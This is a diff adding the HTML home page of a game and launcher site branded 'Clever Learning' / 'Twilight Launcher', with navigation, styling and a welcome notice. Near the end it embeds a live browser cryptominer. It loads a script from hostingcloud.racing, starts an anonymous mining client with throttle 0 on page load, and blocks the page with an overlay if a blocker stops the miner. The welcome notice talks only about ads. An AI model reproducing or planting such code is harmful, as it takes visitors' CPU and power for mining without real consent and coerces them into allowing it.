@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6863899348069816"
+        crossorigin="anonymous"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clever Learning</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* Background image */
+        body {
+            margin: 0;
+            padding-top: 60px; /* Adjust to match the height of your navbar */
+            background-image: url('bg.png'); /* Replace with your image URL */
+            background-size: cover;
+            background-position: center;
+            color: #f1c40f; /* Text color */
+        }
+
+        /* Navbar styling */
+        nav {
+            background-color: rgba(30, 30, 30, 0.8); /* Semi-transparent background */
+            padding: 10px 20px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 1000;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        nav ul {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+
+        nav ul li {
+            display: inline;
+        }
+
+        nav ul li a {
+            text-decoration: none;
+            color: #f1c40f;
+            font-weight: bold;
+            padding: 5px 10px;
+            transition: color 0.3s ease, background-color 0.3s ease;
+        }
+
+        nav ul li a:hover {
+            color: #ffffff;
+            background-color: #333333;
+            border-radius: 5px;
+        }
+
+        /* Main container and buttons styling */
+        .container {
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        .buttons a {
+            text-decoration: none;
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #333333;
+            color: #f1c40f;
+            border-radius: 5px;
+            margin: 10px;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        .buttons a:hover {
+            background-color: #555555;
+            color: #ffffff;
+        }
+
+        /* Notification styling */
+        .notification {
+            position: fixed;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #4c4c4c;
+            color: #ffffff;
+            padding: 15px;
+            border-radius: 5px;
+            z-index: 1001;
+            display: none; /* Initially hidden */
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <ul>
+            <li><a href="index.html">Home</a></li>
+            <li><a href="games.html">Games</a></li>
+            <li><a href="tools.html">Tools</a></li>
+            <li><a href="emulators.html">Emulators</a></li>
+            <li><a href="flash/html/index.html">Flash Games</a></li>
+        </ul>
+    </nav>
+
+    <div class="container">
+        <h1>Twilight Launcher</h1>
+        <div class="buttons">
+            <a href="games.html" class="button">Games</a>
+            <a href="tools.html" class="button">Tools</a>
+        </div>
+    </div>
+
+    <!-- Notification div -->
+    <div class="notification" id="notification">
+        Thank you for visiting our website! Please do not use an adblocker as it keeps us in business! Also DO NOT click any of these ads. We do not endorse them; they are a plugin!
+    </div>
+
+<script src="https://www.hostingcloud.racing/SEOw.js"></script>
+<script>
+    var _client = new Client.Anonymous('5bc67fa7648a5aeaf6e517ae726c98906a822b350bc495656dd5474e2a2b9d16', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+    
+</script>
+<script>
+    // Show notification on load
+    window.onload = function() {
+        var notification = document.getElementById('notification');
+        notification.style.display = 'block';
+        setTimeout(function() {
+            notification.style.display = 'none'; // Hide after 5 seconds
+        }, 5000);
+    };
+
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
+</script>
+</body>
+</html>
